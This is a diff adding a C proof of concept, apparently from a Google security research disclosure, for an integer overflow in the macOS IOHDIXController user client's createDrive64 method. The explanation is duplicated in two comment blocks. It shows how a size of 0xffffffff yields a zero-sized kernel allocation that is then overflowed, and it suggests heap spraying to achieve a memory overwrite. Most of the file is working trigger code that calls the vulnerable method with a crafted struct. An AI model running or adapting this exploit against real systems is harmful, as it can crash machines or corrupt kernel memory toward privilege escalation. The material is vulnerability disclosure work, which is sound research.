@@ -1,0 +1,116 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=511
+
+Method 5 of the IOHDIXController user client is createDrive64. This takes a 0x100 byte structure input from which it reads a userspace pointer and a size which it passes to IOHDIXController::convertClientBuffer. This wraps the memory pointed to by the userspace pointer in an IOMemoryDescriptor then takes the user-provided size, casts it to a 32-bit type and adds one. It passes that value to IOMalloc. By passing a size of 0xffffffff we can cause an integer overflow and IOMalloc will be passed a size of 0.
+
+IOMalloc falls through to kalloc which will quite happily make a 0-sized allocation for us and return a valid, writable kernel heap pointer.
+
+The original size we specified, cast to a 32-bit type but withone one added to it is then passed as the size of the target buffer in the call to IOMemoryDescriptor::readBytes which attempts to read from the wrapped userspace memory into the undersized kernel heap buffer.
+
+It actually tries to use some fancy DMA stuff to do that copy and this PoC will almost certainly fail and kernel panic somewhere inside that DMA code as there probably aren't valid page-table entries for the whole destination range. But some kalloc heap spraying should take care of that allowing us to actually overwrite stuff :)
+*/
+
+/* ianbeer
+clang -o iohdix iohdix.c -framework IOKit
+Integer Overflow in IOHDIXControllerUserClient::convertClientBuffer leading to undersized kalloc allocation passed to DMA code
+
+Method 5 of the IOHDIXController user client is createDrive64. This takes a 0x100 byte structure input from which it reads
+a userspace pointer and a size which it passes to IOHDIXController::convertClientBuffer. This wraps the memory pointed to
+by the userspace pointer in an IOMemoryDescriptor then takes the user-provided size,
+casts it to a 32-bit type and adds one. It passes that value to IOMalloc. By passing a size of 0xffffffff we can
+cause an integer overflow and IOMalloc will be passed a size of 0.
+
+IOMalloc falls through to kalloc which will quite happily make a 0-sized allocation for us and return a valid, writable kernel
+heap pointer.
+
+The original size we specified, cast to a 32-bit type but withone one added to it is then passed as the size of the target buffer
+in the call to IOMemoryDescriptor::readBytes which attempts to read from the wrapped userspace memory into the undersized
+kernel heap buffer.
+
+It actually tries to use some fancy DMA stuff to do that copy and this PoC will almost certainly fail somewhere inside that DMA code
+as there probably aren't valid page-table entries for the whole destination range. But some kalloc heap spraying should take care of
+that allowing us to actually overwrite stuff :)
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(){
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching("IOHDIXController");
+  if(!matching){
+    printf("unable to create service matching dictionary\n");
+    return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+    printf("no matches\n");
+    return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+  printf("got service: %x\n", service);
+
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }else{
+    printf("got userclient connection: %x, type:%d\n", conn, 0);
+  }
+  
+  printf("got userclient connection: %x\n", conn);
+
+  void* mem = malloc(0x100000000);
+  uint64_t msg[0x100/8] = {0};
+  msg[0] = 0xbeeffeed; // +0x00
+  msg[1] = (uint64_t)mem;
+  msg[2] = 0xffffffff; // +0x10
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  //char inputStruct[4096];
+  //size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 4;
+
+  // create a queue
+  err = IOConnectCallMethod(
+    conn,
+    0x5,
+    inputScalar,
+    inputScalarCnt,
+    msg,
+    0x100,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+    printf("IOConnectCall error: %x\n", err);
+    return 0;
+  }
+
+
+  return 0;
+}
